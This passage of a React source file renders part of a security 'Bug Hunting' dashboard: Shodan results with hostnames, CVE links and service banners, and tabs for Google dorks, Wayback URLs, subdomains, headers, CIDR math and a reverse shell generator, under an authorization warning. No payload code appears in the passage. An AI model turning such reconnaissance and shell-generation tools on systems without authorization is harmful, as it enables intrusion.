                  <p className="mb-1 text-[10px] font-medium uppercase text-muted-foreground">Hostnames</p>
                  <div className="flex flex-wrap gap-1">
                    {result.hostnames.map((hostname: string) => (
                      <Badge key={hostname} variant="outline" className="text-[10px] font-mono">
                        {hostname}
                      </Badge>
                    ))}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {result.vulns?.length > 0 && (
            <Card className="border-red-500/30">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-red-400">
                  <AlertTriangle className="inline h-4 w-4 mr-1" />
                  Known CVEs ({result.vulns.length})
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="flex flex-wrap gap-1">
                  {result.vulns.map((cve: string) => (
                    <a key={cve} href={`https://nvd.nist.gov/vuln/detail/${cve}`} target="_blank" rel="noopener noreferrer">
                      <Badge variant="destructive" className="text-[10px] font-mono hover:opacity-80">
                        {cve}
                      </Badge>
                    </a>
                  ))}
                </div>
              </CardContent>
            </Card>
          )}

          {result.services?.length > 0 && (
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm">
                  <Server className="inline h-4 w-4 mr-1 text-primary" />
                  Services
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {result.services.map((service: any, index: number) => (
                    <div key={`${service.port}-${service.transport}-${index}`} className="rounded-md border px-3 py-2">
                      <div className="mb-1 flex items-center gap-2">
                        <Badge variant="outline" className="text-[10px] font-mono">
                          {service.port}/{service.transport}
                        </Badge>
                        {service.product && <span className="text-xs font-medium">{service.product}</span>}
                        {service.version && <span className="text-xs text-muted-foreground">{service.version}</span>}
                      </div>
                      {service.banner && (
                        <pre className="max-h-16 overflow-hidden whitespace-pre-wrap text-[10px] text-muted-foreground">
                          {service.banner}
                        </pre>
                      )}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      )}
    </div>
  )
}

export default function BugHuntingPage() {
  return (
    <div className="space-y-6">
      <PageHeader
        title="Bug Hunting"
        description="Research utilities for authorized target discovery, archive mining, passive intel, and payload generation"
      />

      <div className="rounded-md border border-orange-500/30 bg-orange-500/5 px-4 py-3 text-xs text-orange-400">
        Only use these workflows against systems you are explicitly authorized to test.
      </div>

      <Tabs defaultValue="dorks">
        <TabsList className="flex-wrap h-auto gap-1">
          <TabsTrigger value="dorks">
            <Search className="mr-1.5 h-3.5 w-3.5" />
            Dork Builder
          </TabsTrigger>
          <TabsTrigger value="wayback">
            <Globe className="mr-1.5 h-3.5 w-3.5" />
            Wayback URLs
          </TabsTrigger>
          <TabsTrigger value="subdomains">
            <Shield className="mr-1.5 h-3.5 w-3.5" />
            Subdomains
          </TabsTrigger>
          <TabsTrigger value="headers">
            <Server className="mr-1.5 h-3.5 w-3.5" />
            Headers
          </TabsTrigger>
          <TabsTrigger value="shodan">
            <Search className="mr-1.5 h-3.5 w-3.5" />
            Shodan
          </TabsTrigger>
          <TabsTrigger value="cidr">
            <Calculator className="mr-1.5 h-3.5 w-3.5" />
            CIDR Calc
          </TabsTrigger>
          <TabsTrigger value="revshell">
            <Terminal className="mr-1.5 h-3.5 w-3.5" />
            Rev Shell
          </TabsTrigger>
        </TabsList>

        <TabsContent value="dorks" className="mt-6">
          <DorkBuilder />
        </TabsContent>
        <TabsContent value="wayback" className="mt-6">
          <WaybackSearch />
        </TabsContent>
        <TabsContent value="subdomains" className="mt-6">
          <SubdomainIntel />
        </TabsContent>
        <TabsContent value="headers" className="mt-6">
          <HeaderAnalyzer />
        </TabsContent>
        <TabsContent value="shodan" className="mt-6">
          <ShodanQuickCheck />
        </TabsContent>
        <TabsContent value="cidr" className="mt-6">
          <CidrCalc />
        </TabsContent>
        <TabsContent value="revshell" className="mt-6">
          <RevShellGen />
        </TabsContent>
      </Tabs>
    </div>
  )
}
